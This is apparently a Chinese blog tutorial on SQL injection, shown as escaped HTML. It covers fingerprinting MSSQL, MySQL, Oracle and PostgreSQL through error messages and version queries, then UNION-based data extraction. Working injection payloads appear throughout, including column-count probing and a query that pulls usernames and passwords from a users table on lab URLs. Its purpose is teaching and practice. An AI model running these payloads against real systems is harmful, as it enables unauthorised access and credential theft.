&lt;h3 id=&#34;识别数据库&#34;&gt;&lt;a href=&#34;#识别数据库&#34; class=&#34;headerlink&#34; title=&#34;识别数据库&#34;&gt;&lt;/a&gt;识别数据库&lt;/h3&gt;&lt;p&gt;ASP和.NET通常使用Microsoft SQL Server 作为后台数据库，而PHP应用则很可能使用MySQL或PostgreSQL。如果应用是用Java编写的，那么使用的可能是Oracle或MySQL。此外，底层操作系统也可以提供一些线索：安装 IIS（Intemet信息服务器）作为服务器平台标志着应用是基于Windows的架构，后台数据库很可能是SQLServer。而运行Apache和PHP的Linux服务器则很可能使用的是开源数据库，比如 MySQL或PostgreSQL。&lt;/p&gt;
&lt;h4 id=&#34;非盲跟踪&#34;&gt;&lt;a href=&#34;#非盲跟踪&#34; class=&#34;headerlink&#34; title=&#34;非盲跟踪&#34;&gt;&lt;/a&gt;非盲跟踪&lt;/h4&gt;&lt;p&gt;查询使用的数据库服务器技术不同，这条SQL产生的错误也会不同，可以根据这些不同判断出数据库类型。&lt;/p&gt;
&lt;p&gt;下面是常见的报错&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;mssql&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;Microsoft OLE DB Provider &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; ODBC Drivers error &lt;span class=&#34;token string&#34;&gt;&#39;80040e14&#39;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;Microsof&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;ODBC &lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt; Server Driver&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt; Server&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;Unclosed quotation mark &lt;span class=&#34;token keyword&#34;&gt;after&lt;/span&gt; the &lt;span class=&#34;token keyword&#34;&gt;character&lt;/span&gt;
string&#34;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;products&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;asp&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;line &lt;span class=&#34;token number&#34;&gt;33&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;mysql&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;ERROR &lt;span class=&#34;token number&#34;&gt;1064&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;42000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; : You have an error &lt;span class=&#34;token operator&#34;&gt;in&lt;/span&gt; your &lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt; syntax&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;check&lt;/span&gt; the manual that corresponds &lt;span class=&#34;token keyword&#34;&gt;to&lt;/span&gt; your MySQL server version &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; the &lt;span class=&#34;token keyword&#34;&gt;right&lt;/span&gt; syntax &lt;span class=&#34;token keyword&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;use&lt;/span&gt;
near&lt;span class=&#34;token string&#34;&gt;&#39; &#39;&lt;/span&gt;at line &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;oracle&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;ORA&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;01773&lt;/span&gt;:may &lt;span class=&#34;token operator&#34;&gt;not&lt;/span&gt; specify &lt;span class=&#34;token keyword&#34;&gt;column&lt;/span&gt; datatypes &lt;span class=&#34;token operator&#34;&gt;in&lt;/span&gt; this &lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;TABLE&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;postgreSQL&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;pg_query&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;: Query failed: ERROR: unterminated quoted string at &lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; near at &lt;span class=&#34;token keyword&#34;&gt;character&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;69&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;var&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;www&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;php&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;somepge&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;php &lt;span class=&#34;token keyword&#34;&gt;on&lt;/span&gt; line &lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;获取标志信息&#34;&gt;&lt;a href=&#34;#获取标志信息&#34; class=&#34;headerlink&#34; title=&#34;获取标志信息&#34;&gt;&lt;/a&gt;获取标志信息&lt;/h5&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;数据库服务器&lt;/th&gt;
&lt;th&gt;查询&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;MSSQL&lt;/td&gt;
&lt;td&gt;select @@version&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Mysql&lt;/td&gt;
&lt;td&gt;select version()  &lt;br&gt;select @@version&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Oralce&lt;/td&gt;
&lt;td&gt;select banner from v$version&lt;br&gt;select banner from v$version where rownum=1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PostgreSQL&lt;/td&gt;
&lt;td&gt;select version()&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;mssql&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//www.victim.com/products.asp?id=@@version&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;数据库将传入的@@version当做数字型解析产生报错&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;Microsoft&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;ODBC &lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt; Server Driver&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt; Server&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;Conversion failed &lt;span class=&#34;token keyword&#34;&gt;when&lt;/span&gt; converting the
nvarchar &lt;span class=&#34;token keyword&#34;&gt;value&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Microsoft SQL Server 2005-9.00.3042.00 (Intel X86) Feb 9 2007 22:47:07 Copyright (c) 1988-2005 Microsoft Corporation Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)&#39;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;products&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;asp&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;line &lt;span class=&#34;token number&#34;&gt;33&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这段错误代码表明了数据库为SQL Server 2005，补丁Service Pack 2&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PostgreSQL&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;PostgreSQL &lt;span class=&#34;token number&#34;&gt;9.1&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;.1&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;on&lt;/span&gt; i686&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;pc&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;linux&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;gnu&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; compiled &lt;span class=&#34;token keyword&#34;&gt;by&lt;/span&gt; i686&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;pc&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;linuxgnu&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; gcc &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Gentoo Hardened &lt;span class=&#34;token number&#34;&gt;4.4&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;.5&lt;/span&gt; pl&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; pie&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0.4&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;.5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;bit&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;同样返回了很多底层的信息&lt;/p&gt;
&lt;p&gt;使用具有标志性的字符串或者语句注入，在返回结果（报错结果）中寻找改字符串或者语句的执行结果，如果找到了，这儿就可以作为注入点。&lt;/p&gt;
&lt;p&gt;SQL Server内置变量&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;@&lt;span class=&#34;token variable&#34;&gt;@version&lt;/span&gt;:数据库服务器版本。
@&lt;span class=&#34;token variable&#34;&gt;@servemame&lt;/span&gt;:安装&lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt; Server的服务器名称。
@&lt;span class=&#34;token variable&#34;&gt;@language&lt;/span&gt;：当前所使用语言的名称。
@&lt;span class=&#34;token variable&#34;&gt;@spid&lt;/span&gt;：当前用户的进程ID。
可以使用下列查询获取详细的版本信息：
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; SERVERPROPERTYCproductversion’&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;：例如&lt;span class=&#34;token number&#34;&gt;100.1600&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;.22&lt;/span&gt;。 
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; SERVERPROPERTY&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;productlevel&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;:例如 RTM。
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; SERVERPROPERTY&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;edition&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;:例如 Enterprise。
&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; master&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;msver：更多详细信息，包括处理器数量、处理器类型、物理内存等。&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;盲追踪&#34;&gt;&lt;a href=&#34;#盲追踪&#34; class=&#34;headerlink&#34; title=&#34;盲追踪&#34;&gt;&lt;/a&gt;盲追踪&lt;/h4&gt;&lt;p&gt;应用不会返回信息时，利用不同数据库使用SQL语法不同产生的差异来判断数据库类型。&lt;/p&gt;
&lt;h5 id=&#34;连接字符串的方式&#34;&gt;&lt;a href=&#34;#连接字符串的方式&#34; class=&#34;headerlink&#34; title=&#34;连接字符串的方式&#34;&gt;&lt;/a&gt;连接字符串的方式&lt;/h5&gt;&lt;p&gt;用不同的支付串连接方式注入，通过原始请求返回结果对比，若相同，则为对应数据库。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/db5df62ba1c448f7b78f246d43b03ad3.png&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;数字函数&#34;&gt;&lt;a href=&#34;#数字函数&#34; class=&#34;headerlink&#34; title=&#34;数字函数&#34;&gt;&lt;/a&gt;数字函数&lt;/h5&gt;&lt;p&gt;相当于不同数据库的特征值，原理和前面相似&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/87b6f9ee5436f469cb58fd426a00d7c1.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;例如，成功注入&lt;code&gt;WAITEOR DELAY&lt;/code&gt;，表明数据库是mssql，成功注入&lt;code&gt;select pg_sleep(10)&lt;/code&gt;，表明数据库是PostgreSQL&lt;/p&gt;
&lt;p&gt;Mysql精确确定版本&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/* !版本号 语句*/&lt;/code&gt;若数据库版本号高于或等于！后面的，就会执行语句&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/* !40119 + 1*/&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 2（如果MySQL版本为4.01.19或更高版本）&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 1（其他情况）&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;使用UNION语句提取数据&#34;&gt;&lt;a href=&#34;#使用UNION语句提取数据&#34; class=&#34;headerlink&#34; title=&#34;使用UNION语句提取数据&#34;&gt;&lt;/a&gt;使用UNION语句提取数据&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;column&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;column&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;column&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;N &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;table&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;UNION&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;column&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;column&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;column&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;N &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;table&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 去除重复值&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;UNION&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;ALL&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;-- 重复的也显示&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;返回有这两张表或者两个查询得到的数据&lt;/p&gt;
&lt;h4 id=&#34;匹配列&#34;&gt;&lt;a href=&#34;#匹配列&#34; class=&#34;headerlink&#34; title=&#34;匹配列&#34;&gt;&lt;/a&gt;匹配列&lt;/h4&gt;&lt;p&gt;满足要求&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;两个查询的列数必须相同&lt;/li&gt;
&lt;li&gt;两个select对应列返回的数据类型是兼容的&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果无法满足这两个条件就会查询失败并返回一个错误，下面是一些数据库返回的错误&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/e78b0ba30b6e81959a8c7d560b34f51b.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;要得到正确的列数，两种方法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;每次增加列数，不断尝试&lt;/p&gt;
&lt;p&gt;NULL值会转化为其他任何数据类型，这样能避免因数据类型不同而产生错误。&lt;/p&gt;
&lt;p&gt;mysql&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//test/?id=12+union+select+null-- &lt;/span&gt;
http:&lt;span class=&#34;token comment&#34;&gt;//test/?id=12+union+select+null,null-- &lt;/span&gt;
http:&lt;span class=&#34;token comment&#34;&gt;//test/?id=12+union+select+null,null,null-- &lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;oracle要求每个select必须带from，使用dual（所用用户都能访问）表&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//test/?id=12+union+select+null+from+dual-- &lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;使用order by字句&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//sql/Less-2/?id=12+order+by+1&lt;/span&gt;
http:&lt;span class=&#34;token comment&#34;&gt;//sql/Less-2/?id=12+order+by+2&lt;/span&gt;
http:&lt;span class=&#34;token comment&#34;&gt;//sql/Less-2/?id=12+order+by+3&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- etc&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;若3报错了，2未报错，那么就是两列&lt;/p&gt;
&lt;p&gt;相对下，第二种更优，可以使用二分查找&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;匹配数据类型&#34;&gt;&lt;a href=&#34;#匹配数据类型&#34; class=&#34;headerlink&#34; title=&#34;匹配数据类型&#34;&gt;&lt;/a&gt;匹配数据类型&lt;/h4&gt;&lt;p&gt;假设需要查询一个字符串值，利用一个支付串值一个一个依次替换NULL值，只要不报错，就能确定位置。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//test/?id=12+union+select+&#39; test&#39;,NULL,NULL,NULL &lt;/span&gt;
http:&lt;span class=&#34;token comment&#34;&gt;//test/?id=12+union+select+NULL,&#39;test&#39;,NULL,NULL &lt;/span&gt;
http:&lt;span class=&#34;token comment&#34;&gt;//test/?id=12+union+select+NULL,NULL,&#39;test&#39;,NULL &lt;/span&gt;
http:&lt;span class=&#34;token comment&#34;&gt;//test/?id=12+union+select+NULL,NULL,NULL,&#39;test&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;有些数据库不能使用NULL，只能暴力破解，使用自动化工具&lt;/p&gt;
&lt;p&gt;假设最后一个位置是字符串值，便可以开始检索想要获得的值&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//test/?id=12+union+select+NULL,version(),NULL,NULL&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 获取版本&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;也可以连接多条语句返回多条信息&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//test/?id=12+union+select+NULL,concat(version(),0x7e,database()),NULL&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果想要检索的不是字符串字，却只有支付串值的字段，可以使用强制转换为字符串&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/2a1757616fa87006e38575c695c27afd.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;PostgreSQL允许使用&lt;code&gt;||&lt;/code&gt;连接字符串，只要有一个变量是字符串即可作为字符串值&lt;/p&gt;
&lt;h4 id=&#34;只返回一条结果&#34;&gt;&lt;a href=&#34;#只返回一条结果&#34; class=&#34;headerlink&#34; title=&#34;只返回一条结果&#34;&gt;&lt;/a&gt;只返回一条结果&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//sql/Less-2/?id=12 union select NULL,username,password from users&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 正常来说这条语句可以返回表中所有数据，但是有时只会返回一条数据&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//sql/Less-2/?id=1 and 1=0 union select NULL,username,password from users&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 将前面的查询拼凑成永假式，将返回后面的第一个结果&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

